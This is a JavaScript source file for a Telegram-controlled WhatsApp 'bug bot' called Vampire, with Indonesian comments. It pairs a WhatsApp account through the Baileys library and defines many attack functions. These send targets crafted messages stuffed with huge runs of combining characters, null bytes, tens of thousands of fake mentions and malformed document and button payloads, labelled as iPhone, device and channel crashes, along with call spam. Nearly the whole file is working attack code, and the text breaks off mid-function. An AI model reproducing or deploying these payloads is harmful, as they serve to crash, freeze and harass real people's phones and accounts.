const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./Vampire.jpeg')
const crypto = require('crypto');
const chalk = require('chalk');
const global = require('./VampConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./VampDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./VampDB/premium.json'));
let OwnerUsers = JSON.parse(fs.readFileSync('./VampDB/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./VampDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./VampDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./VampDB/security.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const BOT_TOKEN = global.botToken; // Kalau token ada di VampireConfig.js
const startTime = new Date(); // Waktu mulai online

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);

let sock;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./VampirePrivate/creds.json')) {
                  fs.unlinkSync('./VampirePrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./VampirePrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./VampDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./VampDB/Owner.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./VampDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./VampDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./VampDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./VampDB/premium.json', (data) => (premiumUsers = data));
watchFile('./VampDB/admin.json', (data) => (adminUsers = data));
watchFile('./VampDB/banned.json', (data) => (bannedUser = data));
watchFile('./VampDB/superVip.json', (data) => (superVip = data));
watchFile('./VampDB/security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}
async function VampireBlank(target, ptcp = true) {
  const Vampire = `_*~@8~*_\n`.repeat(10500);
  const CrashNotif = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function VampireSpamNotif(target, Ptcp = true) {
    let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "𝙺𝙾𝙽𝚃𝙾𝙻",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Vampire.Firebase" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function VampireNewUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙸𝚂 𝙱𝙰𝙲𝙺̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

    async function VampireiPhone(target) {
      try {
        await sock.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "ᐯ4ᗰᑭIᖇᗴ IOՏ̊",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
                  body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "ᐯᗩᗰᑭIᖇᗴ ᑎO Oᒪᗴᑎᘜ" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function VampireInvisIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "ᴠᴀᴍᴘɪʀᴇ ᴄʀᴀsʜ ɪᴏs" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function VampireCrashiPhone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "VampireBug ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
// SPECIAL VAMPIRE BUG
async function VampCrashCH(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target }); // Perbaiki dari isTarget ke target

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function VampCrashCH2(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "peler"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "\u0000".repeat(99999)
                                }
                            ]
                        }
                    }
                }
            }
        },
        {},
        { messageId: null }
    );
}

async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function VampNewAttack(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐂𝐥𝐨𝐮𝐝𝐬",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵉᵛᵉʳʸᵇᵒᵈʸ" + "ꦾ".repeat(100000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵐᵃʳᵏ ᶻᵘᶜᵏᵉʳᵇᵉʳᵍ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await vamp.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("VaMPiRe - BuGBoT"));
        }
        async function VampNewCrash(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐧𝐞𝐭",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵖᵒˡᶦᶜᵉ" + "ꦽ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ⁿᵉᵛᵉʳ ˡᵒˢᵗ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ʳᵃⁿˢᵒᵐᵉʷᵃʳᵉ ᵇᵒᵗⁿᵉᵗ.ᶦᵈ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await vamp.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("VaMPiRe - BuGBoT"));
        }
        

//BUG INVIS DELAY NEW VAMPIRE
async function VampDeviceCrash(target, Ptcp = true) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Vampire.Clouds.net",
                        format: "DEFAULT"
                    },
